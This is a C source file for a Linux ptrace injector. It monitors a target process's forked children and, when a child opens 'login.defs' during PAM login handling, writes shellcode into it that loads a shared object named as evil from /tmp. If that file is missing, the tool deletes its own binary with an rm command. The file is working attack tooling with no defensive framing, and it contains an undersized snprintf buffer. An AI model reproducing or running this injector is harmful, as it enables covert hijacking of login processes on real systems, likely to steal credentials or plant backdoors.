#include <stdlib.h>
#include <pthread.h>

#include "utils.h"


int Inject_Shellcode(pid_t target_pid){
        struct user_regs_struct regs, original_regs;
        void *malloc_addr, *dlopen_mode_addr,*mmap_addr;
        uint8_t *remote_code_ptr,*local_code_ptr;
        uint32_t code_length;

        char evilSoPath[] = "/tmp/hello.so";



        FILE *fp;
        fp = fopen(evilSoPath,"r");
        if(fp == NULL){
            printf("- Cannot find so file, Exit and remove");
            char buf[ 1024 ];
	        int count;
 
	        count = readlink( "/proc/self/exe", buf, 1024 );
 
	        if ( count < 0 || count >= 1024 )
	        { 
		        printf( "Failed\n" );
                exit(0);
	        }
	        buf[ count ] = '\0';
	        char cmd[1024];
            snprintf(cmd,2048,"rm %s",buf);
            system(cmd);
            exit(0);
        }else{
            fclose(fp);
        }
        
        if ( ptrace_attach( target_pid ) == -1 ){

                printf("inject attach failed\n" );
                return -1;
        }

        printf ("+ Waiting for process...\n");

        printf ("+ Getting Registers\n");
        if ( ptrace_getregs( target_pid, &regs ) == -1 ){
                printf("- Getregs Error\n" );
                return -1;
        }
        memcpy(&original_regs,&regs,sizeof(struct user_regs_struct));
        printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
        char libc_path[255];
        get_libc_path(target_pid,libc_path);
        void* libc_moudle_base = NULL;
        libc_moudle_base = get_module_base(-1,"libc-");
        void * handle = dlopen(libc_path,RTLD_LAZY);
        void * self_dlopen_mode_addr = dlsym(handle,"__libc_dlopen_mode");
        void * self_malloc_addr = dlsym(handle,"malloc");
        void * self_mmap_addr = dlsym(handle,"mmap");
        printf("+ self libc moudle base:%p\n",libc_moudle_base);
        malloc_addr = get_remote_addr( target_pid, "libc-", (void *)self_malloc_addr );
        mmap_addr = get_remote_addr( target_pid, "libc-", (void *)self_mmap_addr );

        printf("+ remote libc path:%s\n",libc_path);

        printf("+ self libc_dlopen_mode base:%p\n",self_dlopen_mode_addr);

        dlopen_mode_addr = get_remote_addr( target_pid, "libc-", (void *)self_dlopen_mode_addr );

        printf("+ remote malloc addr:%p\n",malloc_addr);
        printf("+ remote mmap addr:%p local:%p\n",mmap_addr,self_mmap_addr);
        printf("+ remote libc_dlopen_mode addr:%p\n",dlopen_mode_addr);
        long parameters[10];
        parameters[0] = 0;      // addr
        parameters[1] = 0x4000; // size
        parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
        parameters[3] =  MAP_ANONYMOUS | MAP_PRIVATE; // flags
        parameters[4] = 0; //fd
        parameters[5] = 0; //offset

        if(ptrace_call( target_pid, (uint64_t)mmap_addr, parameters, 6,&regs,0 )==-1){
                printf("- Writedata Error\n" );
                return -1;
        }
        if ( ptrace_getregs( target_pid, &regs ) == -1 ){
                printf("- Getregs Error\n" );
                return -1;
        }
        printf("+ malloc result: %p\n",regs.rax);


        remote_code_ptr = (char *)regs.rax; //获取mmap取得的地址


        ptrace_writedata(target_pid,remote_code_ptr,evilSoPath,strlen(evilSoPath)+1);

        printf("+ Writing EvilSo Path at:%p\n",remote_code_ptr);
        parameters[1] = 0x2;      // addr
        parameters[0] = remote_code_ptr; // size
        ///////////////////////////////

        //if(ptrace_call( target_pid, (uint64_t)dlopen_mode_addr, parameters, 2,&regs,0 )==-1){
          //      printf("- Called dlopen_mode_addr Error\n" );
            //    return -1;
        //}

        ///////////////////////////////
        extern uint64_t _dlopen_mode_param1_s, _dlopen_mode_addr_s,_inject_start_s,_inject_end_s;
        memcpy((void*)((long)&_dlopen_mode_param1_s+2),&remote_code_ptr,sizeof(long));
        memcpy((void*)((long)&_dlopen_mode_addr_s+2),&dlopen_mode_addr,sizeof(long));

        remote_code_ptr += strlen(evilSoPath)+1;
        local_code_ptr = (uint8_t *)&_inject_start_s;
        code_length = (long)&_inject_end_s - (long)&_inject_start_s;

        ptrace_writedata(target_pid,remote_code_ptr,local_code_ptr,code_length ); //写入本地shellcode
        printf("+ Writing Shellcode at:%p code length:%d\n",remote_code_ptr,code_length);
        regs.rip = (long)remote_code_ptr;

        ptrace_setregs( target_pid, &regs );
        ptrace_continue( target_pid );
        waitpid( target_pid, NULL, WUNTRACED  );

        /////////////////////////////////

        printf("+ EvilSo Injected.\n+ Recorver the regsing...\n-------------------------------\n");
        ptrace_setregs( target_pid, &original_regs );
        ptrace_continue( target_pid );

}



int WaitforLibPAM(pid_t target_pid){
    struct user_regs_struct regs;
    if ( ptrace_attach( target_pid ) == -1 ){

        printf("WaitforLibPAM attach Failed\n" );
        return -1;
    }
    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("- Getregs Error\n" );
        return -1;
    }
    //ptrace_continue( target_pid );
    long num,bit=0,finded = 0;
    char *path = malloc(255);
    char libsystemd[] = "login.defs";
    while(1){
        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
        waitpid( target_pid, NULL, WUNTRACED );
        num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);
            //printf("++ SubProcess: system call num = %ld\n", num);
        if(num ==257){
            ptrace_getregs( target_pid, &regs ) ;
            //printf("++ [%d][openat] SubProcess: rsi :%p\n",target_pid,regs.rsi);
            ptrace_readdata(target_pid,(void *)regs.rsi,path,255);
            //printf("++ [%d][openat] SubProcess:openat path :%s\n",target_pid,path);
            if(strstr(path,libsystemd)){
                printf("++ [%d][openat] SubProcess:openat find path: %s\n",target_pid,path);
                ptrace_detach(target_pid);
                Inject_Shellcode(target_pid);
                break;
            }
        }
        if(num ==2){
            ptrace_getregs( target_pid, &regs ) ;
            //printf("++[%d][open] SubProcess: rdi :%p\n",target_pid,regs.rdi);
            ptrace_readdata(target_pid,(void *)regs.rdi,path,255);
            //printf("++[%d][open] SubProcess:open path :%s\n",target_pid,path);
            if(strstr(path,libsystemd)){
                ptrace_detach(target_pid);
                Inject_Shellcode(target_pid);
                break;
            }
        }

    }
}



int main(int argc, char const *argv[])
{

    pid_t                   target_pid;
    target_pid = atoi (argv[1]);
    //Test_Inject_Shellcode(target_pid);

    struct user_regs_struct regs;
    if ( ptrace_attach( target_pid ) == -1 ){

        printf("attach\n" );
        return -1;
    }
    printf ("+ Waiting for process...\n");
    //wait (NULL);
    printf ("+ Getting Registers\n");
    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
        printf("- Getregs Error\n" );
        return -1;
    }
    printf ("+ RAX is %p\n", (void*)regs.rax);
    //ptrace_continue( target_pid );
    long num,subprocess;
    while(1){
        ptrace( PTRACE_SYSCALL, target_pid, NULL, 0  );
        waitpid( target_pid, NULL, WUNTRACED );
        pthread_t id;
        num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);// 获得调用号值
        if(num == 56){
            //printf("system call num = %ld\n", num);
            ptrace_getregs( target_pid, &regs ); // 获得调用结果
            printf("+ Process maybe = %ld \n", regs.rax);
            subprocess = regs.rax;
            if(subprocess > 0){
                pthread_create(&id,NULL,(void *) WaitforLibPAM,subprocess);
            }

        }
    }

        return 0;
}
